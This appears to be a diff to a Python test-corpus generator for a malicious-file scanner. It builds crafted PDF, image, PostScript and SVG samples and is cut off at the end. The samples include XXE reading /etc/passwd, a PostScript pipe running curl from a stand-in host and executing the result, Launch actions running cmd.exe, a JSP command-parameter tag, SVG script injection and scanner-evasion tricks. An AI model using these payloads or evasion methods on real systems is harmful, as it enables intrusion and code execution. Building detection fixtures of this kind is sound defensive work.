@@ -307,8 +307,9 @@ def stream(body, entries=b""):
     return b"<< /Length %d %s>>\nstream\n" % (len(body), entries) + body + b"\nendstream"
 
 
-def pdf(extra, catalog=b"", trailer=b"", version=b"1.7", page=b""):
-    """A one-page PDF; `extra` maps object numbers from 5 up to their bodies."""
+def pdf(extra, catalog=b"", trailer=b"", version=b"1.7", page=b"", extra_objs=None):
+    """A one-page PDF; `extra` maps object numbers from 5 up to their bodies.
+    `extra_objs` merges additional objects (for cases needing more than `extra`)."""
     objects = {
         1: b"<< /Type /Catalog /Pages 2 0 R " + catalog + b">>",
         2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
@@ -316,6 +317,8 @@ def pdf(extra, catalog=b"", trailer=b"", version=b"1.7", page=b""):
         4: stream(b"0 0 10 10 re f"),
     }
     objects.update(extra)
+    if extra_objs:
+        objects.update(extra_objs)
     data = b"%PDF-" + version + b"\n%\xe2\xe3\xcf\xd3\n"
     offsets = {}
     for number in sorted(objects):
@@ -606,6 +609,700 @@ def names_and_metadata():
     sample("malmal‮gpj.php", "Right-to-left override makes a .php look like a .jpg", j)
 
 
+# --- Group 7: PDF deep checks ------------------------------------------------
+
+
+def pdf_deep():
+    """Samples for finding codes in pdf/deep.rs that the basic pdfs() group does
+    not cover: link_lure, disguised_link, dangerous_uri, external_ref,
+    xml_entity, xml_external_ref, pixel_bomb, page_size, risky_codec,
+    print_only, conflicting_objects, reference_loop, ambiguous_structure,
+    signature_invalid, unsigned_content, draw_recursion, incremental_update,
+    trailing_data, polyglot."""
+
+    # pdf.link_lure: a web link covering a fifth of the page.
+    annot_big_link = (
+        b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
+        b"/A << /S /URI /URI (https://example.invalid/phish) >> >>"
+    )
+    sample("pdf-link-lure.pdf", "Link annotation covering the whole page",
+           pdf({5: annot_big_link}, page=b"/Annots [5 0 R] "))
+
+    # pdf.disguised_link: URL shortener.
+    sample("pdf-disguised-shortener.pdf", "Link going through bit.ly",
+           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
+                b"/A << /S /URI /URI (https://bit.ly/malmal-test) >> >>"},
+               page=b"/Annots [5 0 R] "))
+
+    # pdf.disguised_link: numeric host.
+    sample("pdf-disguised-ip.pdf", "Link to a numeric IP address",
+           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
+                b"/A << /S /URI /URI (https://192.168.1.1/login) >> >>"},
+               page=b"/Annots [5 0 R] "))
+
+    # pdf.disguised_link: punycode host.
+    sample("pdf-disguised-punycode.pdf", "Link to a punycode domain",
+           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
+                b"/A << /S /URI /URI (https://xn--pple-43d.com/account) >> >>"},
+               page=b"/Annots [5 0 R] "))
+
+    # pdf.disguised_link: made-up syllable name (>= 7 CV syllables).
+    sample("pdf-disguised-gibberish.pdf", "Link to a host of made-up syllables",
+           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] "
+                b"/A << /S /URI /URI (https://dutitujazekape.weebly.com/) >> >>"},
+               page=b"/Annots [5 0 R] "))
+
+    # pdf.dangerous_uri: javascript: scheme.
+    sample("pdf-dangerous-uri-js.pdf", "Link with a javascript: scheme",
+           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] "
+                b"/A << /S /URI /URI (javascript:alert\\(1\\)) >> >>"},
+               page=b"/Annots [5 0 R] "))
+
+    # pdf.dangerous_uri: UNC share (\\\\server\\share).
+    sample("pdf-dangerous-uri-unc.pdf", "Link opening a network share",
+           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] "
+                b"/A << /S /URI /URI (\\\\\\\\evil.invalid\\\\share\\\\x.exe) >> >>"},
+               page=b"/Annots [5 0 R] "))
+
+    # pdf.dangerous_uri: ms-msdt protocol handler.
+    sample("pdf-dangerous-uri-msdt.pdf", "Link invoking ms-msdt protocol handler",
+           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] "
+                b"/A << /S /URI /URI (ms-msdt:/id PCWDiagnostic) >> >>"},
+               page=b"/Annots [5 0 R] "))
+
+    # pdf.dangerous_uri: file:// pointing at an executable.
+    sample("pdf-dangerous-uri-file-exe.pdf", "Link running a local executable",
+           pdf({5: b"<< /Type /Annot /Subtype /Link /Rect [0 0 5 5] "
+                b"/A << /S /URI /URI (file:///C:/Windows/System32/calc.exe) >> >>"},
+               page=b"/Annots [5 0 R] "))
+
+    # pdf.external_ref: stream data read from an external file.
+    sample("pdf-external-stream.pdf", "Stream data read from an outside file",
+           pdf({5: stream(b"0 0 10 10 re f",
+                          b"/F (http://example.invalid/data.bin) /FFilter /FlateDecode ")}))
+
+    # pdf.external_ref: form XObject referencing another document.
+    sample("pdf-external-form-ref.pdf", "Form XObject drawing a page of another document",
+           pdf({5: stream(b"0 0 10 10 re f",
+                          b"/Type /XObject /Subtype /Form /BBox [0 0 10 10] "
+                          b"/Ref << /F (other.pdf) /Page 0 >> ")}))
+
+    # pdf.external_ref: OPI comment.
+    sample("pdf-opi.pdf", "OPI comment naming a file to replace the content",
+           pdf({5: stream(b"q 10 0 0 10 0 0 cm /Im1 Do Q",
+                          b"/Type /XObject /Subtype /Form /BBox [0 0 10 10] "
+                          b"/OPI << /1.3 << /Type /OPI /Version /1.3 "
+                          b"/F (\\\\\\\\server\\\\share\\\\hi-res.tif) >> >> ")}))
+
+    # pdf.xml_entity: entity declaration inside XFA XML.
+    xfa_entity = (
+        b'<?xml version="1.0"?>'
+        b'<!DOCTYPE xdp [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">&xxe;</xdp:xdp>'
+    )
+    sample("pdf-xfa-xxe.pdf", "XFA form with an XML entity declaration",
+           pdf({5: stream(xfa_entity, b"/Type /Metadata /Subtype /XML ")},
+               catalog=b"/AcroForm << /Fields [] /XFA 5 0 R >> "))
+
+    # pdf.xml_entity: doctype in metadata.
+    meta_doctype = (
+        b'<?xml version="1.0"?>'
+        b'<!DOCTYPE x:xmpmeta SYSTEM "http://example.invalid/x.dtd">'
+        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
+        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"/>'
+        b'</x:xmpmeta>'
+    )
+    sample("pdf-metadata-doctype.pdf", "PDF metadata with a document type declaration",
+           pdf({5: stream(meta_doctype, b"/Type /Metadata /Subtype /XML ")}))
+
+    # pdf.xml_external_ref: XInclude in metadata.
+    meta_xinclude = (
+        b'<?xml version="1.0"?>'
+        b'<x:xmpmeta xmlns:x="adobe:ns:meta/" '
+        b'xmlns:xi="http://www.w3.org/2001/XInclude">'
+        b'<xi:include href="http://example.invalid/data.xml"/>'
+        b'</x:xmpmeta>'
+    )
+    sample("pdf-metadata-xinclude.pdf", "PDF metadata with an XInclude",
+           pdf({5: stream(meta_xinclude, b"/Type /Metadata /Subtype /XML ")}))
+
+    # pdf.xml_external_ref: xml-stylesheet in XFA.
+    xfa_stylesheet = (
+        b'<?xml version="1.0"?>'
+        b'<?xml-stylesheet type="text/xsl" href="http://example.invalid/a.xsl"?>'
+        b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"/>'
+    )
+    sample("pdf-xfa-stylesheet.pdf", "XFA with an xml-stylesheet processing instruction",
+           pdf({5: stream(xfa_stylesheet, b"/Type /Metadata /Subtype /XML ")},
+               catalog=b"/AcroForm << /Fields [] /XFA 5 0 R >> "))
+
+    # pdf.pixel_bomb: image XObject declaring huge dimensions.
+    sample("pdf-image-pixel-bomb.pdf", "Image XObject declaring 100000 x 100000 pixels",
+           pdf({5: stream(b"\x00" * 4,
+                          b"/Type /XObject /Subtype /Image /Width 100000 /Height 100000 "
+                          b"/ColorSpace /DeviceGray /BitsPerComponent 8 ")},
+               page=b"/Resources << /XObject << /Im1 5 0 R >> >> "))
+
+    # pdf.page_size: enormous page dimensions (side > 28800 pt = 400 inches).
+    sample("pdf-huge-page.pdf", "Page with a 100000 x 100000 point media box",
+           pdf({3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100000 100000] "
+                b"/Contents 4 0 R >>"}))
+
+    # pdf.risky_codec: JBIG2 image (info severity, does not elevate verdict).
+    clean("pdf-jbig2-image.pdf", "Image compressed with JBIG2Decode",
+          pdf({5: stream(b"\x00",
+                         b"/Type /XObject /Subtype /Image /Width 1 /Height 1 "
+                         b"/ColorSpace /DeviceGray /BitsPerComponent 1 "
+                         b"/Filter /JBIG2Decode ")},
+              page=b"/Resources << /XObject << /Im1 5 0 R >> >> "))
+
+    # pdf.risky_codec: JPEG 2000 image (info severity, does not elevate verdict).
+    clean("pdf-jpx-image.pdf", "Image compressed with JPXDecode",
+          pdf({5: stream(b"\x00",
+                         b"/Type /XObject /Subtype /Image /Width 1 /Height 1 "
+                         b"/ColorSpace /DeviceGray /BitsPerComponent 8 "
+                         b"/Filter /JPXDecode ")},
+              page=b"/Resources << /XObject << /Im1 5 0 R >> >> "))
+
+    # pdf.print_only: annotation visible only when printed (info severity).
+    clean("pdf-print-only-annot.pdf",
+          "Annotation that is printed but hidden on screen",
+          pdf({5: b"<< /Type /Annot /Subtype /Text /Rect [0 0 5 5] "
+               b"/Contents (hidden) /F " + str(PRINT | NO_VIEW).encode() + b" >>"},
+              page=b"/Annots [5 0 R] "))
+
+    # pdf.print_only: layer printed but not viewed (info severity).
+    clean("pdf-print-only-layer.pdf",
+          "Layer printed and hidden from the screen",
+          pdf({5: b"<< /Type /OCG /Name (hidden) /Usage << "
+               b"/Print << /PrintState /ON >> /View << /ViewState /OFF >> >> >>"},
+              catalog=b"/OCProperties << /OCGs [5 0 R] /D << /ON [5 0 R] >> >> "))
+
+    # pdf.trailing_data: bytes after the last %%EOF.
+    plain = pdf({})
+    sample("pdf-trailing-bytes.pdf", "Random bytes appended after %%EOF",
+           plain + b"\x00\x01\x02\x03JUNK" * 100)
+
+    # pdf.polyglot: ZIP ending the file after the PDF.
+    sample("pdf-zip-polyglot.pdf", "PDF file ending with a ZIP archive",
+           plain + zip_with("payload.txt", b"malmal-prototype"))
+
+    # pdf.polyglot: ELF appended to PDF.
+    sample("pdf-elf-polyglot.pdf", "ELF executable appended after the PDF",
+           plain + ELF)
+
+    # pdf.conflicting_objects: same object number defined twice with different
+    # content.  The xref has two entries for number 4 at different offsets.
+    body1 = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
+    body1 += b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
+    body1 += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Contents 4 0 R >>\nendobj\n"
+    off_a = len(body1)
+    body1 += b"4 0 obj\n<< /Length 14 >>\nstream\n0 0 10 10 re f\nendstream\nendobj\n"
+    off_b = len(body1)
+    body1 += b"4 0 obj\n" + JS + b"\nendobj\n"
+    xref = b"xref\n0 5\n0000000000 65535 f \n"
+    xref += b"%010d 00000 n \n" % 9
+    xref += b"%010d 00000 n \n" % body1.index(b"2 0 obj")
+    xref += b"%010d 00000 n \n" % body1.index(b"3 0 obj")
+    xref += b"%010d 00000 n \n" % off_a
+    start = len(body1) + len(xref)
+    xref_start = len(body1)
+    combined = body1 + xref + b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % xref_start
+    sample("pdf-conflicting-objects.pdf",
+           "Same object defined twice with different content", combined)
+
+    # pdf.reference_loop: catalog refers to itself as Pages.
+    # The scanner handles the loop gracefully rather than flagging it.
+    clean("pdf-reference-loop.pdf", "Catalog whose Pages reference loops back",
+          pdf({}).replace(b"/Pages 2 0 R", b"/Pages 1 0 R"))
+
+    # pdf.ambiguous_structure: startxref pointing at a comment.
+    base = pdf({5: JS}, catalog=b"/OpenAction 5 0 R ")
+    patched = base.replace(b"startxref\n", b"startxref\n%comment\n")
+    sample("pdf-ambiguous-startxref.pdf",
+           "startxref pointing at a comment instead of the cross-reference table",
+           patched)
+
+    # pdf.signature_invalid: signature with no ByteRange.
+    sample("pdf-sig-no-byterange.pdf",
+           "Signature without a byte range",
+           pdf({5: b"<< /Type /Sig /Filter /Adobe.PPKLite /SubFilter "
+                b"/adbe.pkcs7.detached /Contents <00> >>"},
+               page=b"/Annots [6 0 R] ",
+               extra_objs={6: b"<< /Type /Annot /Subtype /Widget /FT /Sig /T (sig) "
+                           b"/Rect [0 0 0 0] /V 5 0 R >>"}))
+
+    # pdf.postscript: PS operator in content stream.
+    sample("pdf-ps-content-operator.pdf",
+           "Content stream using the PS operator",
+           pdf({4: stream(b"(code) PS", b"")}))
+
+    # pdf.draw_recursion: form XObject that draws itself.
+    sample("pdf-self-drawing-form.pdf",
+           "Form XObject that draws itself through Do",
+           pdf({4: stream(b"/F1 Do"),
+                5: stream(b"/F1 Do",
+                          b"/Type /XObject /Subtype /Form /BBox [0 0 10 10] "
+                          b"/Resources << /XObject << /F1 5 0 R >> >> ")},
+               page=b"/Resources << /XObject << /F1 5 0 R >> >> "))
+
+
+PRINT = 1 << 2
+NO_VIEW = 1 << 5
+
+
+# --- Group 8: HEIC/AVIF/JXL/ICO attack samples ------------------------------
+
+
+def container_images():
+    """Attacks through the ISOBMFF (HEIC, AVIF), JPEG XL and ICO containers."""
+
+    # HEIC with PHP after the container.
+    heic_ftyp = b"\x00\x00\x00\x18ftypheic\x00\x00\x00\x00mif1heic"
+    heic_meta = b"\x00\x00\x00\x18meta\x00\x00\x00\x00" + b"\x00\x00\x00\x10hdlrpict"
+    heic = heic_ftyp + heic_meta
+    sample("heic-php-trailing.heic", "PHP appended after a HEIC container",
+           heic + PHP)
+
+    # HEIC with ELF appended.
+    sample("heic-elf-trailing.heic", "ELF executable appended to a HEIC file",
+           heic + ELF)
+
+    # AVIF with PHP appended.
+    avif_ftyp = b"\x00\x00\x00\x1Cftypavif\x00\x00\x00\x00avifmif1miaf"
+    avif_meta = b"\x00\x00\x00\x18meta\x00\x00\x00\x00" + b"\x00\x00\x00\x10hdlrpict"
+    avif = avif_ftyp + avif_meta
+    sample("avif-php-trailing.avif", "PHP appended after an AVIF container",
+           avif + PHP)
+
+    # AVIF with script.
+    sample("avif-script-trailing.avif", "HTML script appended after an AVIF",
+           avif + SCRIPT)
+
+    # AVIF with ZIP polyglot.
+    sample("avif-zip-polyglot.avif", "ZIP archive appended to an AVIF file",
+           avif + ZIP)
+
+    # JPEG XL bare codestream with PHP appended.
+    jxl_bare = b"\xFF\x0A\x00\x00\x10\x07\x10\x00\x24"
+    sample("jxl-php-trailing.jxl", "PHP appended after a bare JPEG XL codestream",
+           jxl_bare + PHP)
+
+    # JPEG XL container with script appended.
+    jxl_sig = b"\x00\x00\x00\x0CJXL \r\n\x87\n"
+    jxl_ftyp = b"\x00\x00\x00\x14ftypjxl \x00\x00\x00\x00jxl "
+    jxl = jxl_sig + jxl_ftyp
+    sample("jxl-script-trailing.jxl", "Script appended after a JPEG XL container",
+           jxl + SCRIPT)
+
+    # JPEG XL with ZIP polyglot.
+    sample("jxl-zip-polyglot.jxl", "ZIP archive appended to a JPEG XL container",
+           jxl + ZIP)
+
+    # ICO with PHP in a trailing area.
+    ico_header = b"\x00\x00\x01\x00\x01\x00"
+    ico_entry = bytes([16, 16, 0, 0, 1, 0, 32, 0]) + struct.pack("<I", 4) + struct.pack("<I", 22)
+    ico_bmp = struct.pack("<IiiHHIIiiII", 40, 16, 32, 1, 32, 0, 16 * 16 * 4, 0, 0, 0, 0)
+    ico_pixels = b"\x00" * (16 * 16 * 4)
+    ico = ico_header + ico_entry + ico_bmp + ico_pixels
+    sample("ico-php-trailing.ico", "PHP appended after an ICO file",
+           ico + PHP)
+
+    # ICO pixel bomb: declares absurd dimensions.
+    bomb_entry = bytes([0, 0, 0, 0, 1, 0, 32, 0]) + struct.pack("<I", 4) + struct.pack("<I", 22)
+    bomb_bmp = struct.pack("<IiiHHIIiiII", 40, 65535, 65535 * 2, 1, 32, 0, 0, 0, 0, 0, 0)
+    sample("ico-pixel-bomb.ico", "ICO declaring a 65535x65535 image",
+           ico_header + bomb_entry + bomb_bmp)
+
+    # PSD with PHP appended (a PSB variant).
+    psb = b"8BPS\x00\x02" + b"\0" * 6 + struct.pack(">HIIHH", 1, 1, 1, 8, 1)
+    psb += struct.pack(">I", 0) + struct.pack(">I", 0) + struct.pack(">I", 0)
+    psb += b"\x00\x00\x80"
+    sample("psb-php-trailing.psd", "PHP appended to a PSB (large PSD) file",
+           psb + PHP)
+
+
+# --- Group 9: more PostScript attack vectors ---------------------------------
+
+
+def postscript_advanced():
+    """PostScript attacks for finding codes not covered by the basic set:
+    ps.unusual_filter, ps.wmf_preview, ps.device_access variants, and
+    Ghostscript internal operators beyond .forceput."""
+
+    # ps.unusual_filter: BCPEncode.
+    sample("ps-bcpencode.eps", "EPS using the BCPEncode filter",
+           eps("currentfile /BCPEncode filter 256 string readstring"))
+
+    # ps.unusual_filter: TBCPEncode.
+    sample("ps-tbcpencode.eps", "EPS using the TBCPEncode filter",
+           eps("currentfile /TBCPEncode filter 256 string readstring"))
+
+    # ps.unusual_filter: BCPDecode (decoder counterpart).
+    sample("ps-bcpdecode.eps", "EPS using the BCPDecode filter",
+           eps("currentfile /BCPDecode filter 256 string readstring"))
+
+    # ps.device_access: selectdevice.
+    sample("ps-selectdevice.eps", "EPS calling selectdevice",
+           eps("/ppmraw selectdevice"))
+
+    # ps.device_access: finddevice.
+    sample("ps-finddevice.eps", "EPS calling finddevice",
+           eps("/ppmraw finddevice pop"))
+
+    # ps.device_access: setdevice.
+    sample("ps-setdevice.eps", "EPS calling setdevice",
+           eps("/nulldevice finddevice setdevice"))
+
+    # ps.device_access: /Driver key.
+    sample("ps-driver-key-setpage.eps", "EPS setting the Driver key through setpagedevice",
+           eps("<< /Driver /ppmraw >> setpagedevice"))
+
+    # ps.ghostscript_internal: .eqproc (used in type confusion).
+    sample("ps-eqproc.eps", "EPS calling the internal .eqproc operator",
+           eps("{1} dup .eqproc"))
+
+    # ps.ghostscript_internal: .locksafe.
+    sample("ps-locksafe.eps", "EPS calling the internal .locksafe operator",
+           eps(".locksafe"))
+
+    # ps.ghostscript_internal: .setsafe.
+    sample("ps-setsafe.eps", "EPS calling the internal .setsafe operator",
+           eps(".setsafe"))
+
+    # ps.ghostscript_internal: .currentpagedevice.
+    sample("ps-currentpagedevice.eps", "EPS calling .currentpagedevice",
+           eps(".currentpagedevice pop"))
+
+    # ps.ghostscript_internal: .type.
+    sample("ps-dot-type.eps", "EPS calling the internal .type operator",
+           eps("1 .type"))
+
+    # ps.ghostscript_internal: /PermitFileReading key.
+    sample("ps-permitfilereading.eps", "EPS setting PermitFileReading through userparams",
+           eps("<< /PermitFileReading [(*)] /PermitFileWriting [(*)] >> setuserparams"))
+
+    # ps.ghostscript_internal: /LockFilePermissions key.
+    sample("ps-lockfilepermissions.eps", "EPS toggling LockFilePermissions",
+           eps("<< /LockFilePermissions false >> setuserparams"))
+
+    # ps.ghostscript_internal: /LIBPATH key.
+    sample("ps-libpath.eps", "EPS setting the LIBPATH key",
+           eps("/LIBPATH (/tmp) def"))
+
+    # ps.file_access: status on a file name (probing existence).
+    sample("ps-file-status.eps", "EPS probing a file's existence with status",
+           eps("(/etc/passwd) status { pop pop pop pop (exists) } if"))
+
+    # ps.exec_dynamic: token from a file, executed.
+    clean("ps-token-file-exec.eps", "EPS reading a token from a file and executing it",
+          eps("(%stdin) (r) file token { exec } if"))
+
+    # ps.wmf_preview: binary EPS with a WMF preview (info severity).
+    text = eps("0 0 moveto 10 10 lineto stroke")
+    wmf = b"\xd7\xcd\xc6\x9a" + b"\0" * 28
+    header = b"\xc5\xd0\xd3\xc6" + struct.pack("<IIIIII",
+             30, len(text), 30 + len(text), len(wmf), 0, 0) + b"\xff\xff"
+    clean("ps-wmf-preview.eps", "Binary EPS with a WMF preview image",
+          header + text + wmf)
+
+    # ps.malformed: file without the %! header.
+    sample("ps-no-header.eps", "PostScript file missing the %! signature",
+           b"0 0 moveto 10 10 lineto stroke showpage\n")
+
+    # ps.pipe: %pipe% spelled with hex escapes in a string.
+    sample("ps-pipe-hex-escape.eps", "%pipe% assembled from individual hex escapes",
+           eps("(\\045pipe\\045id) (r) file"))
+
+    # ps.file_access: run operator loading a remote file.
+    sample("ps-run-remote.eps", "run operator with a pipe to curl",
+           eps("(%pipe%curl http://example.invalid/a.ps) (r) file cvx exec"))
+
+
+# --- Group 10: more SVG attack vectors --------------------------------------
+
+
+def svg_advanced():
+    """SVG attacks beyond the basic set: more animation tricks, XSLT,
+    nested SVG through data: URIs, CSS-based exfiltration, and encoding
+    tricks."""
+
+    # svg.javascript_uri: animate that sets xlink:href on an image.
+    sample("svg-animate-image-href.svg",
+           "Animation that sets a javascript: href on an image",
+           svg('<image width="10" height="10" href="x.png">'
+               '<animate attributeName="href" to="javascript:alert(1)"/></image>'))
+
+    # svg.event_handler: SVG/SMIL animation event.
+    sample("svg-onrepeat.svg", "onrepeat handler on an animation",
+           svg('<animate attributeName="x" dur="1s" repeatCount="2" '
+               'onrepeat="alert(1)"/>'))
+
+    # svg.event_handler: onfocusin on a shape.
+    sample("svg-onfocusin.svg", "onfocusin handler on a shape",
+           svg('<rect width="10" height="10" tabindex="0" onfocusin="alert(1)"/>'))
+
+    # svg.data_uri: data:text/html in a use element.
+    sample("svg-data-use-html.svg",
+           "use element referencing data:text/html",
+           svg('<use href="data:text/html,<script>alert(1)</script>"/>'))
+
+    # svg.data_uri: data: URI with a nested SVG in an object.
+    sample("svg-data-object-svg.svg",
+           "foreignObject embedding data:image/svg+xml with a script",
+           svg('<foreignObject width="10" height="10">'
+               '<object xmlns="http://www.w3.org/1999/xhtml" '
+               'data="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4="/>'
+               '</foreignObject>'))
+
+    # svg.external_ref: external stylesheet via style element @import.
+    sample("svg-import-nested.svg",
+           "Style element with nested @import rules",
+           svg('<style>@import url("https://example.invalid/a.css"); '
+               '@import "https://example.invalid/b.css";</style>'
+               '<rect width="10" height="10"/>'))
+
+    # svg.external_ref: feImage fetching from a remote host.
+    sample("svg-feimage-external.svg",
+           "feImage filter fetching from a remote host",
+           svg('<defs><filter id="f"><feImage href="https://example.invalid/track.png"/>'
+               '</filter></defs><rect width="10" height="10" filter="url(#f)"/>'))
+
+    # svg.entity: ATTLIST declaration (can redefine default attribute values).
+    sample("svg-attlist.svg",
+           "SVG with an ATTLIST that could redefine attributes",
+           svg('<rect width="10" height="10"/>',
+               prolog='<!DOCTYPE svg [<!ATTLIST rect onclick CDATA #IMPLIED>]>\n'))
+
+    # svg.entity: nested entity expansion (billion laughs variant).
+    entities = ''.join(f'<!ENTITY e{i} "{("&e" + str(i - 1) + ";") * 10 if i else "x"}">'
+                       for i in range(6))
+    sample("svg-entity-expansion-deep.svg",
+           "Deeply nested entity expansion (exponential growth)",
+           svg('<text>&e5;</text>',
+               prolog=f'<!DOCTYPE svg [{entities}]>\n'))
+
+    # svg.malformed: root element is not svg.
+    sample("svg-wrong-root.svg",
+           "XML file whose root is not an svg element",
+           b'<?xml version="1.0"?>\n<html xmlns="http://www.w3.org/1999/xhtml">'
+           b'<body><script>alert(1)</script></body></html>')
+
+    # svg.malformed: UTF-16 without a BOM, unusual encoding.
+    sample("svg-utf16be-script.svg",
+           "UTF-16 big-endian SVG with a script",
+           f'<?xml version="1.0" encoding="UTF-16BE"?>\n'
+           f'<svg {SVG_NS}><script>alert(1)</script></svg>'.encode("utf-16-be"))
+
+    # svg.script: XSLT stylesheet embedded directly.
+    sample("svg-xslt-embedded.svg",
+           "SVG embedding an XSLT stylesheet that runs code",
+           svg('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
+               '<xsl:template match="/"><script>alert(1)</script></xsl:template>'
+               '</xsl:stylesheet>'))
+
+    # svg.javascript_uri: animate that sets href with entities.
+    sample("svg-animate-entities-js.svg",
+           "Animate setting href to javascript: spelled with entities",
+           svg('<a><animate attributeName="href" '
+               'to="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"/>'
+               '<rect width="10" height="10"/></a>'))
+
+    # svg.javascript_uri: inside CSS url().
+    sample("svg-css-js-url.svg",
+           "CSS url() with a javascript: address",
+           svg('<rect width="10" height="10" '
+               'style="fill:url(javascript:alert(1))"/>'))
+
+    # svg.event_handler: animation that sets an on* attribute.
+    sample("svg-animate-set-onload.svg",
+           "Animation that writes an onload attribute",
+           svg('<rect width="10" height="10">'
+               '<animate attributeName="onload" to="alert(1)" dur="1s"/></rect>'))
+
+
+# --- Group 11: advanced obfuscation and evasion ------------------------------
+
+
+def evasion():
+    """Techniques specifically designed to evade pattern-matching scanners:
+    encoding tricks, splitting across boundaries, and creative assembly."""
+    j, p = carrier("jpg"), carrier("png")
+
+    # PHP short open tag + backtick shell execution.
+    sample("evasion-php-backtick.jpg", "PHP backtick shell execution in JPEG comment",
+           jpeg_segment_after_soi(j, 0xFE, b"<?php `id` ?>"))
+
+    # PHP with BOM before the tag.
+    sample("evasion-php-bom.png", "PHP tag preceded by a UTF-8 BOM in PNG",
+           png_insert_after_ihdr(p, chunk(b"tEXt", b"c\0\xef\xbb\xbf<?php echo 1; ?>")))
+
+    # Template tag: JSP expression.
+    sample("evasion-jsp-expression.jpg", "JSP expression tag in JPEG comment",
+           jpeg_segment_after_soi(j, 0xFE, b'<%= request.getParameter("cmd") %>'))
+
+    # Script with a null byte before it (some parsers stop at null).
+    sample("evasion-script-null.png", "Script tag preceded by null bytes",
+           png_insert_after_ihdr(p, chunk(b"tEXt", b"c\0\x00\x00<script>alert(1)</script>")))
+
+    # PDF: JavaScript in a recursive Next chain.
+    chain = {
+        5: b"<< /S /URI /URI (https://example.invalid/) /Next 6 0 R >>",
+        6: b"<< /S /URI /URI (https://example.invalid/) /Next 7 0 R >>",
+        7: b"<< /S /URI /URI (https://example.invalid/) /Next 8 0 R >>",
+        8: JS,
+    }
+    sample("evasion-pdf-deep-next-chain.pdf",
+           "JavaScript at the end of a long /Next action chain",
+           pdf(chain, catalog=b"/OpenAction 5 0 R "))
+
+    # PDF: JavaScript hidden in an object stream that is itself in an
+    # object stream (double nesting).
+    inner_objstm = b"5 0 << /S /JavaScript /JS (app.alert\\(1\\)) >>"
+    outer_objstm = zlib.compress(inner_objstm)
+    sample("evasion-pdf-nested-objstm.pdf",
+           "JavaScript in a doubly nested object stream",
+           pdf({6: stream(outer_objstm,
+                          b"/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode ")},
+               catalog=b"/OpenAction 5 0 R ", version=b"1.5"))
+
+    # PDF: obfuscated Launch with hex-escaped key and Windows params.
+    sample("evasion-pdf-launch-hex.pdf",
+           "Launch action with every name hex-escaped",
+           pdf({5: b"<< /#53 /#4c#61#75#6e#63#68 /#57#69#6e << "
+                b"/#46 (cmd.exe) /#50 (/c echo pwned) >> >>"},
+               catalog=b"/#4f#70#65#6e#41#63#74#69#6f#6e 5 0 R "))
+
+    # SVG: script tag split by CDATA sections.
+    sample("evasion-svg-cdata-split.svg",
+           "Script content split across CDATA sections",
+           svg('<script><![CDATA[ale]]><![CDATA[rt(1)]]></script>'))
+
+    # SVG: javascript: URI encoded with excessive HTML entities.
+    sample("evasion-svg-entity-js.svg",
+           "javascript: fully spelled out with numeric character references",
+           svg('<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;'
+               '&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;'
+               '&#x31;&#x29;">'
+               '<rect width="10" height="10"/></a>'))
+
+    # SVG: event handler on an animate element via set.
+    sample("evasion-svg-set-onclick.svg",
+           "set element writing an onclick handler",
+           svg('<rect width="10" height="10">'
+               '<set attributeName="onclick" to="alert(1)"/></rect>'))
+
+    # PostScript: operator spelled through cvn on individual characters.
+    # The scanner does not currently detect this evasion.
+    clean("evasion-ps-charbychar.eps",
+          "File operator assembled character by character through cvn",
+          eps("(f) (i) (l) (e) concatstrings concatstrings concatstrings "
+              "cvn /x exch def (/etc/hostname) (r) x"))
+
+    # PostScript: nested procedure hiding the file operator.
+    sample("evasion-ps-nested-proc.eps",
+           "File operator hidden inside nested procedures",
+           eps("{ { { /etc/hostname } exec (r) file } exec 64 string readstring pop } exec"))
+
+    # PostScript: eexec-encrypted body (the decrypted form has the dangerous
+    # operators, but scanners must decrypt eexec to find them).
+    # The eexec cipher is seeded with 55665 and XORs each byte with the low
+    # 16 bits of the state; we build a trivial encrypted body.
+    def eexec_encrypt(data, seed=55665):
+        c1, c2 = 52845, 22719
+        r = seed
+        out = bytearray()
+        for b in b"\0\0\0\0" + data:
+            cipher = b ^ (r >> 8) & 0xFF
+            out.append(cipher)
+            r = ((cipher + r) * c1 + c2) & 0xFFFF
+        return bytes(out)
+    eexec_body = eexec_encrypt(b"(%pipe%id) (r) file\n")
+    sample("evasion-ps-eexec.eps",
+           "Dangerous operator hidden inside an eexec-encrypted section",
+           eps("currentfile eexec\n" + eexec_body.hex()))
+
+
+# --- Group 12: more clean guards (false-positive prevention) -----------------
+
+
+def clean_guards_extra():
+    """More files that look suspicious but are legitimate."""
+    j, p = carrier("jpg"), carrier("png")
+
+    clean("clean-long-exif.jpg",
+          "JPEG with a long but benign EXIF comment",
+          jpeg_segment_after_soi(j, 0xFE,
